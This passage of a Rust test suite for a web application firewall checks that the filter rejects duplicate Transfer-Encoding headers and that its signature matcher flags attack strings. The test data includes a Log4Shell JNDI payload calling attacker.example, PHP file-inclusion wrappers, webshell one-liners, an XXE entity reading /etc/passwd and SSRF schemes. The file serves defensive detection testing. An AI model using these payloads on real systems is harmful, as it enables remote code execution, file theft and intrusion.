        assert!(matches!(canon("/api/v1/users"), Cow::Borrowed(_)));
    }

    // ── M5 — duplicate Transfer-Encoding (TE.TE desync) ────────────────

    /// M5 — two `Transfer-Encoding` header lines are inherently ambiguous
    /// (each hop may honour a different one → request smuggling). The old
    /// code read only the first via `.get()`; the fix reads `.get_all()`
    /// and rejects when more than one TE header is present.
    #[test]
    fn duplicate_transfer_encoding_rejected() {
        let f = full_default();
        let mut ctx = RequestContext::test_with("1.1.1.1", "/");
        // Append two distinct TE headers — `with_header` would overwrite,
        // so append directly to exercise the multi-value path.
        {
            let headers = std::sync::Arc::make_mut(&mut ctx.headers);
            headers.append("transfer-encoding", "chunked".parse().unwrap());
            headers.append("transfer-encoding", "identity".parse().unwrap());
        }
        match f.check(&ctx) {
            FilterAction::Deny { status, reason } => {
                assert_eq!(status, 400);
                assert!(
                    reason.contains("multiple transfer-encoding"),
                    "unexpected reason: {reason}"
                );
            }
            other => panic!("expected duplicate-TE smuggling deny, got {other:?}"),
        }
    }

    /// M5 — a single legitimate `Transfer-Encoding: chunked` (no CL) must
    /// still pass the smuggling gate (regression guard for the fix).
    #[test]
    fn single_chunked_te_allowed_by_smuggling_gate() {
        let f = full_default();
        let ctx =
            RequestContext::test_with("1.1.1.1", "/").with_header("transfer-encoding", "chunked");
        // Not a smuggling deny (could still be Allow or something else,
        // but must not be the 400 smuggling rejections).
        match f.check(&ctx) {
            FilterAction::Deny {
                status: 400,
                reason,
            } => {
                panic!("single chunked TE wrongly rejected: {reason}")
            }
            _ => {}
        }
    }

    // ── New high-severity signature families (Log4Shell / LFI / XXE) ───
    // These attacks were confirmed bypassing the live stand (returned
    // 200) before the corpus was extended. Each family asserts an attack
    // payload matches AND a benign string in the same shape does NOT, to
    // guard against over-broad patterns hitting legitimate traffic.

    #[test]
    fn log4shell_jndi_signature_matched() {
        let f = make(vec![], None);
        // Canonical Log4Shell payload (lowercased by canon).
        assert_eq!(
            f.match_signature("${jndi:ldap://attacker.example/a}"),
            Some("rce")
        );
        // Scheme-only variants where the `${` was obfuscated upstream.
        assert_eq!(f.match_signature("jndi:rmi://x/y"), Some("rce"));
        assert_eq!(f.match_signature("jndi:dns://x"), Some("rce"));
        // Benign: ordinary text mentioning "jndi" without a scheme must
        // NOT match (no `${jndi:` and no `jndi:<scheme>`).
        assert_eq!(f.match_signature("the jndi tutorial explains naming"), None);
    }

    #[test]
    fn php_lfi_wrapper_signature_matched() {
        let f = make(vec![], None);
        assert_eq!(
            f.match_signature("/?file=php://filter/convert.base64-encode/resource=index.php"),
            Some("lfi")
        );
        assert_eq!(f.match_signature("phar://malicious.phar/x"), Some("lfi"));
        assert_eq!(f.match_signature("expect://id"), Some("lfi"));
        assert_eq!(f.match_signature("zip://payload.zip%23shell"), Some("lfi"));
        assert_eq!(
            f.match_signature("data://text/plain;base64,zzz"),
            Some("lfi")
        );
        // Benign: a normal path that happens to end in ".php" and a URL
        // containing "php" must NOT trip the wrapper signatures.
        assert_eq!(f.match_signature("/index.php?page=home"), None);
        assert_eq!(f.match_signature("https://php.example.com/docs"), None);
    }

    #[test]
    fn php_webshell_signatures_matched() {
        let f = make(vec![], None);
        // Classic dumb-shell sink+superglobal one-liners (as posted in a body
        // or query). match_signature canonicalises (lowercases) the input.
        assert_eq!(
            f.match_signature("<?php eval($_POST['cmd']); ?>"),
            Some("webshell")
        );
        assert_eq!(f.match_signature("system($_GET['c'])"), Some("webshell"));
        assert_eq!(f.match_signature("assert($_REQUEST[0])"), Some("webshell"));
        assert_eq!(f.match_signature("shell_exec($_POST[x])"), Some("webshell"));
        // Packer / obfuscation unpacking idiom.
        assert_eq!(
            f.match_signature("eval(base64_decode('ZXZhbA=='))"),
            Some("webshell")
        );
        assert_eq!(
            f.match_signature("eval(gzinflate(base64_decode($x)))"),
            Some("webshell")
        );
        // Known dropped-shell filenames in the URI.
        assert_eq!(f.match_signature("/uploads/c99.php"), Some("webshell"));
        assert_eq!(f.match_signature("/images/wso.php?a=1"), Some("webshell"));
        assert_eq!(f.match_signature("/tmp/b374k.php"), Some("webshell"));
        // Benign: ordinary content mentioning these words in a non-exec form
        // must NOT trip. (Bare `eval(` lives under xss, not webshell; a normal
        // PHP page request and a doc URL stay clean of the webshell category.)
        assert_eq!(f.match_signature("/blog/how-to-use-eval-in-js"), None);
        assert_eq!(f.match_signature("/api/v1/users?system=metric"), None);
        assert_eq!(f.match_signature("/docs/base64_decode-reference"), None);
    }

    #[test]
    fn xxe_doctype_entity_signature_matched() {
        let f = make(vec![], None);
        assert_eq!(
            f.match_signature("<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>"),
            // The leftmost match wins; `<!doctype` precedes `<!entity`.
            Some("xxe")
        );
        assert_eq!(
            f.match_signature("<!ENTITY x SYSTEM \"http://x/\">"),
            Some("xxe")
        );
        // Benign: prose containing the word "doctype" / "entity" without
        // the `<!` DTD-declaration prefix must NOT match.
        assert_eq!(
            f.match_signature("set the html doctype and escape each entity"),
            None
        );
    }

    #[test]
    fn extra_ssrf_schemes_signature_matched() {
        let f = make(vec![], None);
        assert_eq!(f.match_signature("ldap://internal/cn=admin"), Some("ssrf"));
        assert_eq!(f.match_signature("jar:file:///tmp/x.jar!/y"), Some("ssrf"));
        // Benign: a hostname starting with "jar" or text mentioning ldap
        // (no `://` scheme) must NOT match.
        assert_eq!(f.match_signature("https://jardin.example.com/"), None);
        assert_eq!(f.match_signature("our ldap directory is up"), None);
    }
}
